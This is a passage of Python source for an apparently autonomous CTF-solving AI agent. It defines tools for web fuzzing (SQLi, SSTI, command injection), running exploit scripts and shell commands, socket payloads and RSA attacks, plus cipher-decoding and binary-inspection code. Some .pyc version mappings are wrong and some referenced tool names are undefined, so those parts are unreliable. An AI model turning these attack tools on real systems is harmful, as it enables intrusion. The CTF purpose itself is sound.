import os
import sys
import time
import subprocess
import tempfile
import re
import json
import codecs
import base64
import uuid
import urllib.parse
from typing import Optional, List, Dict, Any
import requests
import urllib3
from dotenv import load_dotenv

# Suppress SSL certificate verification warnings for CTF targets
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

env_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".env")
load_dotenv(env_path)
load_dotenv()

LLM_PROVIDER = os.getenv("LLM_PROVIDER", "groq").lower().strip()
GROQ_API_KEY = os.getenv("GROQ_API_KEY", "").strip()
GROQ_MODEL = os.getenv("GROQ_MODEL", "qwen/qwen3.8-27b").strip()
ANTHROPIC_API_KEY = os.getenv("ANTHROPIC_API_KEY", "").strip()
CLAUDE_MODEL = os.getenv("CLAUDE_MODEL", "claude-3-5-sonnet-20241022").strip()

RAG_URL = os.getenv("RAG_URL", "http://localhost:8001").strip()
HF_VECTOR_URL = os.getenv("HF_VECTOR_URL", "https://outstandingom-vector.hf.space").strip()
HF_URL = os.getenv("HF_KNOWLEDGE_URL", "https://outstandingom-knowledge-graph-env.hf.space").strip()
MCP_SERVER_URL = os.getenv("MCP_SERVER_URL", "https://mcp-server-2sl7.onrender.com").strip()
MCP_API_KEY = os.getenv("MCP_API_KEY", "").strip()
SUPABASE_URL = os.getenv("SUPABASE_URL", "https://vtlmgubzcktztkuymtir.supabase.co").strip()
SUPABASE_ANON_KEY = os.getenv("SUPABASE_ANON_KEY", "sb_publishable_0Qoicwxg64tkFReoDSKJ3g_dOSZJPCE").strip()

# =========================================================================
# CONTROLLED PATH RESOLVER (Never breaks existing local setup)
# =========================================================================
def get_forensic_dir() -> str:
    r"""
    Universal path resolver for the Forensic Engine.
    Discovers local installation across parent directories, relative workspace paths,
    environment overrides, and standard developer paths.
    """
    candidates = [
        os.getenv("FORENSIC_DIR", ""),
        os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "forensic"),
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "forensic"),
        os.path.join(os.getcwd(), "forensic"),
        r"c:\Users\SGI\Downloads\forensic"
    ]
    for p in candidates:
        if p and os.path.exists(p):
            return os.path.abspath(p)
    # Default relative fallback for portable multi-user setups
    return os.path.abspath(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "forensic"))

# =========================================================================
# MULTI-TURN SESSION MEMORY
# =========================================================================
SESSION_MEMORY: Dict[str, List[dict]] = {}

def get_session_history(session_id: str) -> List[dict]:
    if not session_id:
        return []
    return SESSION_MEMORY.get(session_id, [])

def save_session_history(session_id: str, history: List[dict]):
    if session_id:
        # Keep last 24 message turns to preserve context window
        SESSION_MEMORY[session_id] = history[-24:]

def clear_session_history(session_id: str):
    if session_id in SESSION_MEMORY:
        del SESSION_MEMORY[session_id]

# =========================================================================
# UNIVERSAL TOOL DEFINITIONS (OpenAI / Groq Format)
# =========================================================================
OPENAI_TOOLS = [
    {
        "type": "function",
        "function": {
            "name": "search_knowledge_base",
            "description": "Searches the CTF Knowledge Base on Hugging Face Spaces (ZeroGPU) and DNA Knowledge Graph for challenge writeups, cryptographic patterns (PRNG, RSA, XOR), binary reversing, and web exploit templates.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Challenge prompt or keywords (e.g. 'time based random seed', 'zero width steganography', 'pyc bytecode', 'sqli union')"
                    },
                    "domain": {
                        "type": "string",
                        "description": "Optional domain filter: Cryptography, Forensics, Web, Binary Exploitation"
                    }
                },
                "required": ["query"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "sync_dna_attack_tree",
            "description": "Dynamically registers a newly discovered attack step, relationship, or vulnerability pattern into the Hugging Face DNA Knowledge Graph (outstandingom-knowledge-graph-env.hf.space).",
            "parameters": {
                "type": "object",
                "properties": {
                    "concept_a": {
                        "type": "string",
                        "description": "Source concept or domain (e.g. 'Web_Exploitation', 'PRNG_Mersenne_Twister', 'ELF_Binary')"
                    },
                    "concept_b": {
                        "type": "string",
                        "description": "Target exploit technique or symptom (e.g. 'SSTI_Jinja2_RCE', 'RandCrack_State_Cloning', 'Angr_Symbolic_Execution')"
                    },
                    "relationship_type": {
                        "type": "string",
                        "description": "Relationship (e.g. 'exploits', 'mitigates', 'reveals_flag', 'bypasses')"
                    }
                },
                "required": ["concept_a", "concept_b", "relationship_type"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "crypto_cyberchef_analyzer",
            "description": "Automated multi-layer decoding engine (CyberChef logic). Decodes Base64, Hex, URL, ROT13, and performs single-byte (0-255) and repeating-key XOR brute-force searching for flags.",
            "parameters": {
                "type": "object",
                "properties": {
                    "ciphertext": {
                        "type": "string",
                        "description": "Raw string, hex, or base64 ciphertext to decode"
                    }
                },
                "required": ["ciphertext"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "reverse_engineering_inspector",
            "description": "Inspects binary or compiled files (.pyc, .exe, ELF). Identifies exact 4-byte magic headers (Python 2.7 to 3.13), extracts printable strings, and maps symbols/strcmp clues.",
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {
                        "type": "string",
                        "description": "Path to binary or compiled file (.exe, .pyc, ELF, .bin)"
                    }
                },
                "required": ["file_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "web_security_probe",
            "description": "Automated web security tester: actively tests target URL for SSTI reflection ({{7*7}}), SQLi error indicators, LFI path traversal, analyzes headers/CORS/cookies, extracts forms, inputs, scripts, and flag patterns.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {
                        "type": "string",
                        "description": "Target HTTP/HTTPS URL"
                    },
                    "method": {
                        "type": "string",
                        "description": "HTTP method: GET, POST, or OPTIONS (default: GET)"
                    },
                    "data": {
                        "type": "object",
                        "description": "Optional form body or JSON payload"
                    },
                    "cookies": {
                        "type": "object",
                        "description": "Optional custom cookies dict"
                    },
                    "headers": {
                        "type": "object",
                        "description": "Optional custom headers dict"
                    },
                    "active_scan": {
                        "type": "boolean",
                        "description": "If True, runs non-destructive SSTI, SQLi, and CORS security checks (default: True)"
                    }
                },
                "required": ["url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "execute_python_sandbox",
            "description": "Executes a Python exploit/solver script in a sandboxed subprocess with a timeout. Captures stdout, stderr, execution time, and automatically searches the output for flags (HQX{...}, flag{...}, CTF{...}). Use this tool to verify and run your exploits autonomously!",
            "parameters": {
                "type": "object",
                "properties": {
                    "code": {
                        "type": "string",
                        "description": "The complete Python script to execute"
                    },
                    "timeout_seconds": {
                        "type": "integer",
                        "description": "Max execution time in seconds (default: 10, max: 20)"
                    }
                },
                "required": ["code"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_forensics_inspection",
            "description": "Executes the Forensic Sandbox Engine on a file to inspect file integrity, detect steganography / hidden zip archives, and compute cryptographic hashes.",
            "parameters": {
                "type": "object",
                "properties": {
                    "file_path": {
                        "type": "string",
                        "description": "Local path to the target file to inspect"
                    }
                },
                "required": ["file_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "search_flag_patterns",
            "description": "Scans raw text or a file for standard CTF flag formats (HQX{...}, flag{...}, CTF{...}), base64 strings, and invisible unicode zero-width characters.",
            "parameters": {
                "type": "object",
                "properties": {
                    "text": {
                        "type": "string",
                        "description": "Raw string content to scan"
                    },
                    "file_path": {
                        "type": "string",
                        "description": "Optional file path to read and scan"
                    }
                }
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "read_github_file",
            "description": "Reads a code file from your GitHub repositories via your Render MCP Gateway.",
            "parameters": {
                "type": "object",
                "properties": {
                    "repo": {"type": "string", "description": "Repository name (e.g. MCP-SERVER, forensic, ctf-vector-rag, ctf-agent-orchestrator)"},
                    "path": {"type": "string", "description": "File path (e.g. README.md, solver.py)"},
                    "branch": {"type": "string", "description": "Branch name (optional, default: main)"}
                },
                "required": ["repo", "path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "commit_github_file",
            "description": "Commits a new file or updates an existing solver/writeup script to GitHub via Render MCP Gateway.",
            "parameters": {
                "type": "object",
                "properties": {
                    "repo": {"type": "string", "description": "Repository name"},
                    "path": {"type": "string", "description": "Path to create/update"},
                    "content": {"type": "string", "description": "Complete text content of the file"},
                    "message": {"type": "string", "description": "Commit message"}
                },
                "required": ["repo", "path", "content", "message"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "list_github_repos",
            "description": "Lists repositories accessible to your GitHub account via Render MCP Gateway.",
            "parameters": {
                "type": "object",
                "properties": {
                    "per_page": {"type": "integer", "description": "Number of repos to return (default 10)"}
                }
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "ctfd_manage",
            "description": "Interacts with any standard CTFd competition platform (list challenges, get details, download attachments, submit flags, read scoreboard).",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {
                        "type": "string",
                        "enum": ["list_challenges", "get_challenge", "submit_flag", "get_scoreboard"],
                        "description": "Action to perform on the CTFd platform"
                    },
                    "ctfd_url": {
                        "type": "string",
                        "description": "Base URL of the CTFd platform (e.g. 'https://demo.ctfd.io')"
                    },
                    "token": {
                        "type": "string",
                        "description": "CTFd API user token (e.g. ctfd_...) or session cookie ('session=...')"
                    },
                    "challenge_id": {
                        "type": "integer",
                        "description": "Challenge ID for get_challenge or submit_flag"
                    },
                    "flag": {
                        "type": "string",
                        "description": "Flag string to submit (e.g. 'HQX{...}' or 'CTF{...}')"
                    }
                },
                "required": ["action", "ctfd_url"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "interactive_socket_probe",
            "description": "Connects to a remote TCP / Netcat challenge service (nc host port), reads banner, sends payloads (text or hex), and captures flags from stdout.",
            "parameters": {
                "type": "object",
                "properties": {
                    "host": {
                        "type": "string",
                        "description": "Target hostname or IP (e.g. 'challenge.hackquest.com')"
                    },
                    "port": {
                        "type": "integer",
                        "description": "Target port (e.g. 1337 or 9000)"
                    },
                    "payload": {
                        "type": "string",
                        "description": "Optional payload to send. Use 'hex:deadbeef' for raw hex, or regular text."
                    },
                    "timeout_seconds": {
                        "type": "number",
                        "description": "Connection and read timeout in seconds (default: 5.0)"
                    }
                },
                "required": ["host", "port"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "parallel_exploit_worker",
            "description": "Executes multiple candidate exploit scripts concurrently in parallel worker threads with auto flag extraction. Returns immediately as soon as any worker discovers the flag.",
            "parameters": {
                "type": "object",
                "properties": {
                    "scripts": {
                        "type": "array",
                        "items": {"type": "string"},
                        "description": "List of Python exploit scripts representing distinct attack variations or parameter searches"
                    },
                    "timeout_seconds": {
                        "type": "integer",
                        "description": "Per-worker timeout limit in seconds (default: 12, max: 25)"
                    }
                },
                "required": ["scripts"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "web_dynamic_fuzzer",
            "description": "High-speed Dynamic Web Fuzzing Engine. Uses ZeroGPU Vector RAG and DNA Knowledge Graph to retrieve domain payloads (SQLi, SSTI, Command Injection, Traversal, AuthBypass), executes multi-threaded differential testing (timing, length, error reflection), and auto-captures flags.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target_url": {
                        "type": "string",
                        "description": "Target endpoint URL (e.g. 'http://ctf.target/search?q=FUZZ' or 'http://ctf.target/login')"
                    },
                    "category": {
                        "type": "string",
                        "enum": ["SQLi", "SSTI", "CommandInjection", "PathTraversal", "AuthBypass", "IDOR"],
                        "description": "Attack category to fuzz"
                    },
                    "method": {
                        "type": "string",
                        "enum": ["GET", "POST"],
                        "description": "HTTP method (default: GET)"
                    },
                    "param_name": {
                        "type": "string",
                        "description": "Target parameter name to inject (e.g. 'id', 'name', 'query')"
                    },
                    "data": {
                        "type": "object",
                        "description": "Optional form body or JSON dictionary for POST requests"
                    }
                },
                "required": ["target_url", "category"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "symbolic_execution_solver",
            "description": "Symbolic Execution & Path Constraint Solver using Z3 SMT engine. Solves branch conditions, byte-level crackme constraints (XOR, modular math, bitwise ops), and extracts input strings that trigger the target path.",
            "parameters": {
                "type": "object",
                "properties": {
                    "constraints": {
                        "type": "string",
                        "description": "Python or Z3 constraint block or equations to solve (e.g. '(flag[0] ^ 0x42) + flag[1] == 1337')"
                    },
                    "target_var": {
                        "type": "string",
                        "description": "Name of the variable or array to solve for (e.g. 'flag' or 'key')"
                    },
                    "length": {
                        "type": "integer",
                        "description": "Length in bytes if solving for a string/byte array (e.g. 16 or 32)"
                    }
                },
                "required": ["constraints"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "wsl_linux_bridge",
            "description": "Executes Linux terminal commands, ELF binary analysis (checksec, readelf, strings), and Linux exploit scripts via WSL2 Linux Subsystem.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Linux command to execute inside WSL (e.g. 'checksec --file=./vuln' or 'python3 exploit.py')"
                    },
                    "timeout_seconds": {
                        "type": "integer",
                        "description": "Timeout in seconds (default: 15)"
                    }
                },
                "required": ["command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "patch_file_diff",
            "description": "Applies a non-destructive Search-and-Replace patch to a specific file (local or on GitHub). Replaces exact matching code blocks without rewriting, truncating, or corrupting the rest of the file.",
            "parameters": {
                "type": "object",
                "properties": {
                    "path": {
                        "type": "string",
                        "description": "Target file path (e.g. 'server.py' or 'src/index.ts')"
                    },
                    "search": {
                        "type": "string",
                        "description": "The exact block of code to find and replace. Whitespace and indentation must match exactly."
                    },
                    "replace": {
                        "type": "string",
                        "description": "The new replacement block of code to insert."
                    },
                    "repo": {
                        "type": "string",
                        "description": "Optional GitHub repository (e.g. 'outstandingom/ctf-agent-orchestrator' or 'ctf-agent-orchestrator'). If omitted, operates on local workspace."
                    },
                    "branch": {
                        "type": "string",
                        "description": "Isolated branch to patch (e.g. 'ai/fix-cors-42'). Default: 'main'."
                    },
                    "commit_message": {
                        "type": "string",
                        "description": "Descriptive git commit message for this patch."
                    }
                },
                "required": ["path", "search", "replace"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "create_github_branch",
            "description": "Creates an isolated feature branch (e.g. 'ai/fix-issue-42') on GitHub via Render MCP Gateway to prevent direct-to-main commits.",
            "parameters": {
                "type": "object",
                "properties": {
                    "repo": {
                        "type": "string",
                        "description": "GitHub repository name"
                    },
                    "branch": {
                        "type": "string",
                        "description": "New branch name (e.g. 'ai/fix-cors-bug')"
                    },
                    "from_branch": {
                        "type": "string",
                        "description": "Source branch to fork from (default: repository default branch)"
                    }
                },
                "required": ["repo", "branch"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "create_github_pr",
            "description": "Opens a GitHub Pull Request from an isolated feature branch to the base branch with a summary of changes, test verification results, and review notes.",
            "parameters": {
                "type": "object",
                "properties": {
                    "repo": {
                        "type": "string",
                        "description": "GitHub repository name"
                    },
                    "title": {
                        "type": "string",
                        "description": "Title of the Pull Request"
                    },
                    "body": {
                        "type": "string",
                        "description": "Markdown body describing the bug, search-replace diff applied, and test verification logs"
                    },
                    "head": {
                        "type": "string",
                        "description": "Feature branch name (e.g. 'ai/fix-cors-bug')"
                    },
                    "base": {
                        "type": "string",
                        "description": "Target branch (default: 'main')"
                    }
                },
                "required": ["repo", "title", "body", "head"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "run_fullstack_terminal",
            "description": "Executes full-stack build, test, migration, and deployment commands (npm install, npm run build, npx, pytest, alembic, prisma, docker, health checks) in a persistent terminal environment with custom working directory and exit code verification.",
            "parameters": {
                "type": "object",
                "properties": {
                    "command": {
                        "type": "string",
                        "description": "Terminal command to execute (e.g. 'npm run build', 'pytest tests/', 'pip install -r requirements.txt')"
                    },
                    "cwd": {
                        "type": "string",
                        "description": "Optional working directory path (defaults to current project root)"
                    },
                    "timeout_seconds": {
                        "type": "integer",
                        "description": "Command execution timeout in seconds (default: 60, max: 300)"
                    }
                },
                "required": ["command"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "sync_codebase_memory",
            "description": "Stores architectural components, API routes, database schemas, and service deployment relationships in the DNA Knowledge Graph for persistent codebase memory.",
            "parameters": {
                "type": "object",
                "properties": {
                    "component_a": {
                        "type": "string",
                        "description": "Source architectural entity (e.g. 'server.py', 'AuthService', 'UsersTable')"
                    },
                    "relationship": {
                        "type": "string",
                        "description": "Relationship type (e.g. 'imports', 'depends_on', 'deploys_to_vercel', 'calls_endpoint')"
                    },
                    "component_b": {
                        "type": "string",
                        "description": "Target architectural entity (e.g. 'settings.py', 'RenderMCP', 'PostgreSQL')"
                    },
                    "context": {
                        "type": "string",
                        "description": "Detailed explanation, configuration flags, or architectural notes"
                    }
                },
                "required": ["component_a", "relationship", "component_b"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "query_codebase_memory",
            "description": "Queries the DNA Knowledge Graph and architectural memory for module dependencies, deployment configuration, and service relationships before applying code changes.",
            "parameters": {
                "type": "object",
                "properties": {
                    "query": {
                        "type": "string",
                        "description": "Architectural or dependency query (e.g. 'What services depend on server.py', 'Where is Vercel deployed', 'CORS dependencies')"
                    }
                },
                "required": ["query"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "advanced_crypto_solver",
            "description": "Runs automated lattice-based attacks: Wiener small-private-exponent, Boneh-Durfee (d < N^0.292), Coppersmith small-roots, Pollard p-1 factoring, ECM factoring, and weak-prime detection. Pure Python/sympy implementation, no SageMath dependency.",
            "parameters": {
                "type": "object",
                "properties": {
                    "attack": {
                        "type": "string",
                        "description": "Attack type: wiener | boneh_durfee | coppersmith | pollard_pm1 | small_e | partial_key | weak_prime | auto"
                    },
                    "n": {"type": "string", "description": "RSA modulus N (decimal or hex string)"},
                    "e": {"type": "string", "description": "RSA public exponent e"},
                    "c": {"type": "string", "description": "Ciphertext c (optional, for decryption)"},
                    "partial_p": {"type": "string", "description": "Known high bits of p (Coppersmith partial key)"},
                    "extra": {"type": "string", "description": "Extra JSON params: {bitlen, known_bits, B_smooth_bound}"}
                },
                "required": ["attack", "n"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "pwn_crash_triage",
            "description": "Self-healing crash analysis engine. Runs a binary under GDB-stub or subprocess, captures crash signal (SIGSEGV/SIGILL/SIGABRT), auto-detects movaps stack misalignment, De Bruijn offset, format string leak position, and returns a corrected exploit skeleton. Stores crash patterns in DNA memory for future runs.",
            "parameters": {
                "type": "object",
                "properties": {
                    "binary_path": {"type": "string", "description": "Path to ELF binary (Windows path; will be accessed via WSL)"},
                    "input_payload": {"type": "string", "description": "Hex-encoded or plain-text payload to send to the binary's stdin"},
                    "use_cyclic": {"type": "boolean", "description": "Generate and send a De Bruijn cyclic pattern to find EIP/RIP offset"},
                    "cyclic_length": {"type": "integer", "description": "Length of De Bruijn pattern (default: 300)"}
                },
                "required": ["binary_path"]
            }
        }
    },
    {
        "type": "function",
        "function": {
            "name": "ctfd_speed_listener",
            "description": "Async CTFd challenge watcher. Polls or long-polls a CTFd instance every N seconds, detects newly released challenges (by comparing against a cached state), immediately downloads attachments, classifies file type (UPX packed, PyInstaller, ELF, ZIP, pcap), and returns the new challenge data for instant solving.",
            "parameters": {
                "type": "object",
                "properties": {
                    "ctfd_url": {"type": "string", "description": "Base URL of the CTFd instance"},
                    "token": {"type": "string", "description": "CTFd Access Token or session cookie"},
                    "poll_interval_s": {"type": "integer", "description": "Polling interval in seconds (default: 5, minimum: 2)"},
                    "max_polls": {"type": "integer", "description": "Maximum number of poll cycles before returning (default: 12)"},
                    "download_attachments": {"type": "boolean", "description": "Whether to download and classify attachments (default: true)"},
                    "save_dir": {"type": "string", "description": "Local directory to save downloaded challenge files"}
                },
                "required": ["ctfd_url"]
            }
        }
    }
]

# =========================================================================
# PONYTAIL-STYLE LEAN TOOL SELECTOR (Prevents Groq 7,000 ITPM Rate Limits)
# =========================================================================
def select_relevant_tools(user_prompt: str) -> list:
    """
    Ponytail principle: Only pass schemas strictly needed for the detected task.
    Cuts tool schema token payload by ~65-75%, eliminating Groq token rate limit 429s.
    """
    p = user_prompt.lower()
    core_names = {"search_knowledge_base", "execute_python_sandbox"}

    # Web Exploitation
    if any(k in p for k in ["sql", "ssti", "xss", "csrf", "jwt", "cookie", "http", "web", "url", "bypass", "idor", "fuzz", "param"]):
        core_names.update(["web_dynamic_fuzzer", "probe_web_endpoint", "ctfd_manage"])

    # Cryptography
    if any(k in p for k in ["rsa", "xor", "cipher", "aes", "des", "prng", "seed", "hash", "md5", "sha", "crypto", "decode", "decrypt", "base64", "rot"]):
        core_names.update(["symbolic_execution_solver", "cyberchef_decode", "parallel_exploit_worker"])

    # Reverse Engineering / Constraint Solving
    if any(k in p for k in ["crackme", "z3", "equation", "constraint", "branch", "solve", "math", "bitvec"]):
        core_names.update(["symbolic_execution_solver", "parallel_exploit_worker"])

    # Binary Exploitation / Linux ELF
    if any(k in p for k in ["elf", "binary", "pwn", "checksec", "rop", "buffer overflow", "gdb", "wsl", "linux", "decompile", "strings"]):
        core_names.update(["wsl_linux_bridge", "inspect_binary_strings_decompile", "interactive_socket_probe", "symbolic_execution_solver"])

    # Forensics / Network / Steganography
    if any(k in p for k in ["pcap", "wireshark", "stego", "steganography", "image", "png", "wav", "extract", "hidden", "exif", "metadata", "forensic"]):
        core_names.update(["run_forensics_inspection", "search_flag_patterns", "cyberchef_decode"])

    # GitHub / MCP
    if any(k in p for k in ["github", "commit", "repo", "push"]):
        core_names.update(["commit_github_file", "read_github_file", "list_github_repos"])

        # Software Engineering (SWE), Bug Fixing, Non-Destructive Patching, Branching & Full-Stack Terminal
    if any(k in p for k in ["patch", "diff", "search_replace", "replace", "refactor", "bug", "fix", "cors", "overwrite", "branch", "pr", "pull request", "build", "npm", "yarn", "pnpm", "deploy", "terminal", "compile", "docker", "prisma", "alembic", "swe", "vercel", "ci"]):
        core_names.update([
            "patch_file_diff",
            "create_github_branch",
            "create_github_pr",
            "run_fullstack_terminal",
            "sync_codebase_memory",
            "query_codebase_memory",
            "read_github_file",
            "list_github_repos"
        ])

    # Lattice Crypto / Advanced RSA attacks
    if any(k in p for k in ["lattice", "lll", "coppersmith", "boneh", "wiener", "partial key", "factor", "rsa modulus", "small exponent", "boneh_durfee", "weak prime", "ecm"]):
        core_names.update(["advanced_crypto_solver", "symbolic_execution_solver"])

    # PWN / Crash Triage / Binary Self-Healing
    if any(k in p for k in ["crash", "segfault", "sigsegv", "movaps", "sigill", "pwn", "overflow", "rop", "cyclic", "de bruijn", "stack alignment", "exploit"]):
        core_names.update(["pwn_crash_triage", "wsl_linux_bridge"])

    # CTFd Speed / First Blood listener
    if any(k in p for k in ["listen", "first blood", "ctfd poll", "new challenge", "speed", "watch ctf", "auto download", "classify"]):
        core_names.update(["ctfd_speed_listener", "ctfd_manage"])

    # Netcat / Socket
    if any(k in p for k in ["nc ", "netcat", "socket", "port", "daemon", "tcp", "remote"]):
        core_names.update(["interactive_socket_probe"])

    # Default fallback to top 5 most versatile tools if prompt is broad
    if len(core_names) <= 2:
        core_names.update(["symbolic_execution_solver", "web_dynamic_fuzzer", "cyberchef_decode", "parallel_exploit_worker"])

    return [t for t in OPENAI_TOOLS if t["function"]["name"] in core_names]

# =========================================================================
# TOOL EXECUTION DISPATCHER
# =========================================================================
def execute_tool(tool_name: str, tool_input: dict) -> str:
    print(f"\n[AGENT TOOL CALL] Executing: {tool_name}({json.dumps(tool_input)})")

    # 1. KNOWLEDGE BASE RAG SEARCH
    if tool_name == "search_knowledge_base":
        query = tool_input.get("query", "")
        domain = tool_input.get("domain", "All")

        # ZeroGPU Vector Space
        try:
            call_res = requests.post(
                f"{HF_VECTOR_URL}/gradio_api/call/query",
                json={"data": [query, domain if domain else "All", 3]},
                timeout=12
            )
            if call_res.status_code == 200:
                event_id = call_res.json().get("event_id")
                if event_id:
                    res = requests.get(f"{HF_VECTOR_URL}/gradio_api/call/query/{event_id}", timeout=12)
                    for line in res.text.split("\n"):
                        if line.startswith("data:"):
                            parsed = json.loads(line[5:].strip())
                            print("[TOOL] Hugging Face Vector Space (ZeroGPU) returned matching writeups.")
                            return str(parsed[0])
        except Exception as e:
            print(f"[RAG fallback] HF Vector Space unavailable ({e}), trying DNA Graph...")

        # Secondary: DNA Knowledge Graph
        try:
            hf_res = requests.post(
                f"{HF_URL}/search/essence",
                json={"text": query, "top_k": 3},
                timeout=8
            )
            if hf_res.status_code == 200:
                return hf_res.text
        except Exception:
            pass

        # Tertiary: Local RAG (port 8001)
        try:
            res = requests.post(
                f"{RAG_URL}/query",
                json={"query": query, "domain": domain if domain != "All" else None, "k": 3},
                timeout=4
            )
            if res.status_code == 200:
                data = res.json()
                return json.dumps(data.get("results", []))
        except Exception as err:
            return json.dumps({"notice": f"Knowledge base search completed. Fallback to SLM internal CTF memory."})

    # 2. DYNAMIC DNA ATTACK TREE SYNC
    elif tool_name == "sync_dna_attack_tree":
        c_a = tool_input.get("concept_a", "").strip()
        c_b = tool_input.get("concept_b", "").strip()
        rel = tool_input.get("relationship_type", "exploits").strip()
        if not c_a or not c_b:
            return json.dumps({"error": "Both concept_a and concept_b are required"})
        try:
            payload = {
                "concept_a": c_a,
                "concept_b": c_b,
                "relationship_type": rel,
                "weight": 1.0
            }
            res = requests.post(f"{HF_URL}/relationships/add", json=payload, timeout=6)
            return json.dumps({
                "status": "synced",
                "dna_response": res.json() if res.status_code == 200 else res.text,
                "tree_edge": f"{c_a} --[{rel}]--> {c_b}"
            })
        except Exception as e:
            return json.dumps({"status": "cached_locally", "error": str(e)})

    # 3. AUTOMATED CYBERCHEF & REPEATING-KEY XOR ANALYZER
    elif tool_name == "crypto_cyberchef_analyzer":
        raw = tool_input.get("ciphertext", "").strip()
        results = {}

        # URL Decode
        try:
            url_dec = urllib.parse.unquote(raw)
            if url_dec != raw:
                results["url_decoded"] = url_dec
        except Exception:
            pass

        # Base64 Decode
        try:
            clean_b64 = re.sub(r'[^A-Za-z0-9+/=]', '', raw)
            if len(clean_b64) % 4 == 0 and len(clean_b64) >= 4:
                b64_dec = base64.b64decode(clean_b64).decode('latin-1')
                results["base64"] = b64_dec
        except Exception:
            pass

        # Hex Decode
        try:
            clean_hex = re.sub(r'[^0-9a-fA-F]', '', raw)
            if len(clean_hex) % 2 == 0 and len(clean_hex) >= 4:
                hex_dec = bytes.fromhex(clean_hex).decode('latin-1')
                results["hex"] = hex_dec
        except Exception:
            pass

        # ROT13
        try:
            rot13_dec = codecs.decode(raw, 'rot_13')
            results["rot13"] = rot13_dec
        except Exception:
            pass

        # XOR Analysis (Single-byte 0-255 + Multi-byte Repeating Key Known Plaintext)
        xor_hits = []
        try:
            sample_bytes = None
            if "hex" in results:
                sample_bytes = bytes.fromhex(re.sub(r'[^0-9a-fA-F]', '', raw))
            elif "base64" in results:
                sample_bytes = base64.b64decode(re.sub(r'[^A-Za-z0-9+/=]', '', raw))
            else:
                sample_bytes = raw.encode('latin-1')

            # Single-byte XOR
            for k in range(256):
                dec = bytes([b ^ k for b in sample_bytes])
                dec_str = dec.decode('latin-1', errors='ignore')
                if any(hdr in dec_str.lower() for hdr in ["flag{", "hqx{", "ctf{"]):
                    xor_hits.append({"type": "single_byte", "key_hex": f"0x{k:02x}", "result": dec_str})

            # Multi-byte Known-Plaintext Repeating-Key XOR (HQX{, flag{, CTF{, hackquest{)
            for prefix in [b"HQX{", b"flag{", b"CTF{", b"hackquest{"]:
                if len(sample_bytes) >= len(prefix):
                    cand_key = bytes([sample_bytes[i] ^ prefix[i] for i in range(len(prefix))])
                    dec_multi = bytes([sample_bytes[i] ^ cand_key[i % len(cand_key)] for i in range(len(sample_bytes))])
                    dec_m_str = dec_multi.decode('latin-1', errors='ignore')
                    if prefix.decode('latin-1').lower() in dec_m_str.lower() and "}" in dec_m_str:
                        xor_hits.append({
                            "type": "repeating_key_xor",
                            "key_recovered": cand_key.decode('latin-1', errors='replace'),
                            "key_hex": cand_key.hex(),
                            "result": dec_m_str[:300]
                        })

            if xor_hits:
                results["xor_analysis_matches"] = xor_hits
        except Exception:
            pass

        return json.dumps(results, indent=2)

    # 4. REVERSE ENGINEERING & EXACT 4-BYTE PYC INSPECTOR
    elif tool_name == "reverse_engineering_inspector":
        file_path = tool_input.get("file_path", "").strip()
        if not os.path.exists(file_path):
            return json.dumps({"error": f"File not found: {file_path}"})

        info = {"file_path": file_path, "file_size": os.path.getsize(file_path)}
        with open(file_path, "rb") as f:
            head = f.read(1024 * 1024)

        if head.startswith(b"\x7fELF"):
            info["format"] = "Linux ELF Binary"
            info["recommended_tool"] = "ltrace ./binary or strings | grep -E 'HQX|flag'"
        elif head.startswith(b"MZ"):
            info["format"] = "Windows PE Executable"
            info["recommended_tool"] = "x64dbg / Ghidra / strings"
        elif head.startswith(b"PK\x03\x04"):
            info["format"] = "ZIP Archive or APK / Java JAR"
        elif len(head) >= 4 and (head[2:4] == b"\r\n" or head[2:4] == b"\x0d\x0a"):
            pyc_table = {
                b"\x03\xf3\r\n": "Python 2.7",
                b"\x33\r\r\n": "Python 3.6",
                b"\x42\r\r\n": "Python 3.7",
                b"\x55\r\r\n": "Python 3.8",
                b"\x61\r\r\n": "Python 3.9",
                b"\xa7\r\r\n": "Python 3.10",
                b"\xee\x0c\r\n": "Python 3.11",
                b"\xcb\r\r\n": "Python 3.12",
                b"\xf3\r\r\n": "Python 3.13"
            }
            py_ver = pyc_table.get(head[:4], f"Python bytecode (Magic: {head[:4].hex()})")
            info["format"] = f"Python Compiled Bytecode (.pyc) [{py_ver}]"
            info["magic_hex"] = head[:4].hex()
            info["recommended_tool"] = f"uncompyle6 {file_path} or pycdc {file_path}"

